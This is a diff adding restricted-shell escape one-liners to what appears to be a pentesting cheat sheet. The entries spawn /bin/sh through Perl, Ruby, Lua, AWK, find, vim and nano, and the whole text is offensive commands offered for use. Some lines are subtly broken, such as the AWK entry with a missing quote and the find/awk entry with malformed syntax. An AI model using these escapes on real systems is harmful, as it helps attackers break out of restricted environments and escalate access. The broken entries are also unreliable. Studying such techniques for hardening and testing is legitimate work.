@@ -73,3 +73,34 @@ python -c 'import pty; pty.spawn("/bin/sh")'
 
 Interactive shell
 /bin/sh -i
+
+Perl shell
+perl -e 'exec "/bin/sh";'
+perl: exec "/bin/sh";
+
+Ruby shell
+ruby: exec "/bin/sh"
+
+Lua shell
+lua: os.execute('/bin/sh')
+
+AWK shell
+awk 'BEGIN {system("/bin/sh)}'
+
+Using find for shell
+find / -name nameoffile -exec /bin/awk 'BEGIN system{"/bin/sh"}' \;
+
+Using exec for shell
+find . -exec /bin/sh \; -quit 
+
+Using VIM for shell
+vim -c ':!/bin/sh'
+
+Using VIM escpae 
+vim
+:set shell=/bin/sh
+:shell
+
+Using nano for shell
+expect -c 'spawn nano; send "\x12\x18/bin/sh\r"'
+
